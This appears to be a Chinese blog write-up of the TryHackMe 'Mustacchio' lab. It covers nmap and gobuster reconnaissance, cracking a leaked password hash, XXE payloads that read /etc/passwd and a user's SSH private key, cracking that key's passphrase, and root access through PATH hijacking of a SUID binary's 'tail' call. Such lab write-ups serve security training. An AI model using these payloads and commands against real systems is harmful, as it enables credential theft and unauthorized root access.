---
title: "THM Mustacchio"
description: "TryHackMe篇之Mustacchio"

date: 2024-10-15T14:59:34+08:00
lastmod: 2025-11-11T12:22:18+08:00

math: true
mermaid: true

categories:
  - TryHackMe
tags:
  - Linux
---
<!--more-->

> 靶机ip：10.10.235.246

# 信息收集

## nmap扫描

`nmap -T4 -A -sV -sC -p- 10.10.235.246`

```nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-15 15:02 CST
Stats: 0:05:21 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 98.06% done; ETC: 15:07 (0:00:06 remaining)
Stats: 0:05:45 elapsed; 0 hosts completed (1 up), 1 undergoing Traceroute
Traceroute Timing: About 32.26% done; ETC: 15:08 (0:00:00 remaining)
Nmap scan report for 10.10.235.246
Host is up (0.30s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)
|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)
|_  256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry
|_/
|_http-title: Mustacchio | Home
8765/tcp open  http    nginx 1.10.3 (Ubuntu)
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Mustacchio | Login
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|specialized|storage-misc
Running (JUST GUESSING): Linux 3.X|5.X (90%), Crestron 2-Series (86%), HP embedded (85%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:5.4 cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3
Aggressive OS guesses: Linux 3.10 - 3.13 (90%), Linux 5.4 (88%), Crestron XPanel control system (86%), HP P2000 G3 NAS device (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   275.52 ms 10.14.0.1
2   355.01 ms 10.10.235.246

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 361.77 seconds
```

可以看出开放了22，80，8765端口

## 80端口

![image-20241015150958963](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241015151010430-1583807408.png)

扫描下目录

`gobuster dir -u http://10.10.235.246/ -w /usr/share/wordlists/dirb/common.txt`

![image-20241015151701655](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241015151712711-928501733.png)

发现有个`robots.txt`，访问一下

![image-20241015151741043](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241015151751823-1230137278.png)

没啥东西，继续查看其他目录文件

![image-20241015152243976](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241015152256352-1632797138.png)

在`/custom/js/`下找到`users.bak`文件，像是备份文件，下载到本地查看

![image-20241015152847711](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241015152858740-1160933654.png)

看起来像是数据库中的数据，这里有admin的加密密码，尝试破解一下

![image-20241015153022188](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241015153033461-1519619990.png)

利用`john`成功获取到admin用户的明文密码`bulldog19`

## 8765端口

![image-20241015151918464](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241015151929654-275177714.png)

像是admin后台登陆页面

使用之前获取到的用户名密码尝试登录

![image-20241015153151381](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241015153202210-1089947038.png)

成功登录

像是添加内容的一个页面，查看下源码

![image-20241015153400373](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241015153411288-847205401.png)

又得到两个重要提示，一个是另一个bak文件，一个提示我们可以使用ssh连接Barry用key，但是我们目前还没有Barry用户的key

先看下bak文件

![image-20241015153618211](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241015153629081-249297029.png)

内容有点像之前添加内容的格式，尝试添加一下

![image-20241015153823235](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241015153834233-1962745226.png)

发现格式正确，可以试下其他的内容，测试是否存在xxe漏洞

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment>
```

![image-20241015154121078](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241015154132533-1313842141.png)

发现能够读取`/etc/passwd`文件，我们就可以尝试读取`Barry`用户的ssh私钥来登录该用户

# SSH获取user权限

首先确定好私钥的绝对路径

`/home/barry/.ssh/id_rsa`

构造恶意内容

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///home/barry/.ssh/id_rsa'>]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment>
```

![image-20241015154505258](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241015154516232-8958968.png)

成功读取到私钥，将其保存至`id_rsa`文件**（注意格式）**，并赋予`600`权限，爆破加密私钥的密码

利用ssh通过私钥登录的方式常熟登录Barry用户

先将`id_rsa`转换成hash格式

![image-20241015155420384](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241015155431516-1174663865.png)

使用john爆破密码

`john rsa_hash --wordlist=/usr/share/wordlists/rockyou.txt`

![image-20241015155545683](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241015155556279-2034530019.png)

发现密码`urieljames`，使用私钥登录ssh

`ssh barry@10.10.235.246 -i id_rsa`

![image-20241015155809630](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241015155820199-1962063428.png)

登陆成功

![image-20241015155833241](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241015155843741-2084925548.png)

在当前目录下找到`user.txt`

# 提升至root权限

## 寻找提权目标

使用`sudo -l`试试

![image-20241015160114807](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241015160125542-1414416860.png)

发现用不了，再试试find命令

`find / -type f -perm -u=s 2>/dev/null `

![image-20241015160335569](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241015160354842-450932405.png)

大多数命令都无法利用，但是发现有个不同的文件`/home/joe/live_log`，可以查看一下

![image-20241015161615266](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241015161626529-819413202.png)

发现是一个elf文件，运行一下试试

![image-20241015161642992](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241015161654143-1177441879.png)

发现是打印网站的日志的功能

使用strings检查一下

![image-20241015162039262](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241015162050015-1226680986.png)

检查后发现这个文件在执行的时候会调用`tail`命令，我们就可以通过劫持该命令进行提权

## 劫持环境变量提权

具体操作如下：

```bash
echo '#!/bin/bash' > /tmp/tail
echo '/bin/bash' >> /tmp/tail
chmod +x /tmp/tail
export PATH=/tmp:$PATH
```

![image-20241015163231776](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241015163243415-624662868.png)

再运行时，就会按照顺序执行我们构造的`tail`命令，导致权限提升

![image-20241015163312818](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241015163323308-831948752.png)

成功提权

![image-20241015163344478](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241015163355336-310839046.png)

在`/root`下找到`root.txt`

